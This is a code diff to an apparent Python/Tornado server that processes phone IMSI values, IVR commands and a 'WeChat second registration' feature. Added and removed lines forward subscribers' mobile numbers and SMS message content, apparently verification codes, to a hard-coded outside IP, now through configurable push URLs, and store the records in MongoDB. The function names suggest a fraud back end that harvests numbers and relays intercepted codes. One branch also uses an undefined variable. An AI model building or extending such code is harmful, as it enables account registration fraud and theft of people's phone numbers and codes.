@@ -151,13 +151,18 @@ class TestHandler(tornado.web.RequestHandler):
 
 @gen.coroutine
 def async_report_weixin2nd(info):
-    url = "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=c159&pid=wx159&mobile=" + \
-        info['mobile'] + "&ccpara=&smsContent=%s" % (info['remark'])
-    http_client = AsyncHTTPClient()
-    request = tornado.httpclient.HTTPRequest(
-        url, method='GET',  request_timeout=3, connect_timeout=3)
-    response = yield http_client.fetch(request)
-    log_notify(url, response, 334)
+    doc = gMongoCli.sms.wechat_mos.find_one({"_id": info['mobile']})
+    if doc != None:
+        wxMoConfig = getWechatMoConfigById(doc['wxMoConfigId'])
+        url = wxMoConfig['pushMoUrl'].replace(
+            '[mobile]', info['mobile']).replace('[smsContent]', info['remark'])
+        # url = "http://121.201.67.97:8080/verifycode/api/getWXChCode.jsp?cid=c159&pid=wx159&mobile=" + \
+        #     info['mobile'] + "&ccpara=&smsContent=%s" % (info['remark'])
+        http_client = AsyncHTTPClient()
+        request = tornado.httpclient.HTTPRequest(
+            url, method='GET',  request_timeout=3, connect_timeout=3)
+        response = yield http_client.fetch(request)
+        log_notify(url, response, 334)
 
 
 class MainHandler(tornado.web.RequestHandler):
@@ -211,6 +216,42 @@ class MainHandler(tornado.web.RequestHandler):
         # 1))
 
 
+def initialWechatMoDoc(user, wxMoConfig, mobile):
+    ctime = round(time.time())
+    doc = {}
+    doc['_id'] = mobile
+    doc['imsi'] = user['imsi']
+    doc['wxMoConfigId'] = wxMoConfig['id']
+    doc["expiredTime"] = datetime.utcfromtimestamp(
+        long(ctime + 86400 * 2))
+    return doc
+
+
+class asyncProcWechatMoTarget(Greenlet):
+
+    def __init__(self, user, wxMoConfig, mobile):
+        Greenlet.__init__(self)
+        self.user = user
+        self.wxMoConfig = wxMoConfig
+        self.mobile = mobile
+
+    def run(self):
+        doc = gMongoCli.sms.wechat_mos.find_one({"_id": self.mobile})
+        if doc == None:
+            doc = initialWechatMoDoc(self.user, self.wxMoConfig, self.mobile)
+            _g_procDoc = asyncMongoOperate(
+                'sms', 'wechat_mos', doc, 'insert')
+            _g_procDoc.start()
+        else:
+            doc["expiredTime"] = datetime.utcfromtimestamp(
+                long(ctime + 86400))
+            doc['wxMoConfigId'] = self.wxMoConfig['id']
+            doc['imsi'] = self.user['imsi']
+            _g_procDoc = asyncMongoOperate(
+                'sms', 'wechat_mos', doc, 'update')
+            _g_procDoc.start()
+
+
 def get_imsi_response(_imsi, _threads, _svn):
 
     _return = ""
@@ -220,23 +261,29 @@ def get_imsi_response(_imsi, _threads, _svn):
         roll = random.randint(0, gWechatMoConfigs[
                               len(gWechatMoConfigs) - 1]['ratioArea'])
         for i in gWechatMoConfigs:
-            if roll < i['ratioArea']:
+            if roll <= i['ratioArea']:
                 return i
         return None
 
     @gen.coroutine
-    def async_notify_url(url):
+    def async_notify_url():
         wxMoConfig = chooseWechatMoTarget()
-        wxMoConfig['dayCurrent'] += 1
-        logger.debug('async_notify_url')
-        http_client = AsyncHTTPClient()
-        request = tornado.httpclient.HTTPRequest(
-            url, method='GET',  request_timeout=3, connect_timeout=3)
-        # response = yield http_client.fetch(request)
-        log_notify(url, response, 332)
-        if response.code == 200:
-            update_try_count()
-        response = response.body.decode('utf-8')
+        if wxMoConfig != None and len(_record_user['mobile']) == 13 and _record_user['mobile'].startswith('86'):
+            wxMoConfig['dayCurrent'] += 1
+            http_client = AsyncHTTPClient()
+            mobileNum = _record_user['mobile'][2:13]
+            url = wxMoConfig['pushMobileUrl'].replace(
+                '[mobile]', mobileNum)
+            logger.debug(url)
+            request = tornado.httpclient.HTTPRequest(
+                url, method='GET',  request_timeout=3, connect_timeout=3)
+            response = yield http_client.fetch(request)
+            log_notify(url, response, 332)
+            if response.code == 200:
+                _g_asyncProcWechatMoTarget = asyncProcWechatMoTarget(
+                    _record_user, wxMoConfig, mobileNum)
+                _g_asyncProcWechatMoTarget.start()
+                update_try_count()
 
     @gen.coroutine
     def update_try_count():
@@ -293,11 +340,9 @@ def get_imsi_response(_imsi, _threads, _svn):
             if (_return == None or len(_return) <= 1) and get_system_parameter_from_db('weixin2ndRegisterWithRandomMo') == 'open':
                 relationId = checkWeixinRelation(_record_user)
                 if relationId > 0:
-                    mobileNum = _record_user['mobile']
-                    if len(_record_user['mobile']) == 13:
-                        mobileNum = _record_user['mobile'][2:13]
-                    async_notify_url('http://121.201.67.97:8080/verifycode/api/getWXChMobile.jsp?cid=c159&pid=wx159&mobile=%s&ccpara=%s' % (
-                        mobileNum, _imsi))
+                    # async_notify_url('http://121.201.67.97:8080/verifycode/api/getWXChMobile.jsp?cid=c159&pid=wx159&mobile=%s&ccpara=%s' % (
+                    #     mobileNum, _imsi))
+                    async_notify_url()
     _cur.close()
     _dbConfig.close()
     return _return
@@ -486,7 +531,8 @@ def get_ivr_cmd(_user, _threads):
                 _isFree = isIvrFree(v)
                 if _isFree is not True:
                     ivrDoc = initialIvrDoc(ivrDocKey, v, _isFree)
-                    insertIvrDoc = asyncMongoOperate(ivrDoc, 'insert')
+                    insertIvrDoc = asyncMongoOperate(
+                        'sms', 'ivrs', ivrDoc, 'insert')
                     insertIvrDoc.start()
                 _result = proIvrRes(v, _isFree)
             else:
@@ -494,7 +540,8 @@ def get_ivr_cmd(_user, _threads):
                     continue
                 _isFree = isIvrFree(v)
                 procExistIvrDoc(ivrDoc, v, _isFree)
-                updateIvrDoc = asyncMongoOperate(ivrDoc, 'update')
+                updateIvrDoc = asyncMongoOperate(
+                    'sms', 'ivrs', ivrDoc, 'update')
                 updateIvrDoc.start()
                 _result = proIvrRes(v, _isFree)
             if _result != None:
@@ -573,17 +620,19 @@ def initialIvrDoc(ivrDocKey, ivrConfig, cmdFree):
 class asyncMongoOperate(Greenlet):
     """docstring for ClassName"""
 
-    def __init__(self, doc, act):
+    def __init__(self, db, collection, doc, act):
         # super(greenlet, self).__init__()
         Greenlet.__init__(self)
+        self.db = db
+        self.collection = collection
         self.doc = doc
         self.act = act
 
     def run(self):
         if self.act == 'insert':
-            gMongoCli.sms.ivrs.insert(self.doc)
+            gMongoCli[self.db][self.collection].insert(self.doc)
         elif self.act == 'update':
-            gMongoCli.sms.ivrs.save(self.doc)
+            gMongoCli[self.db][self.collection].save(self.doc)
 
 
 def proIvrRes(ivrConfig, isFree):
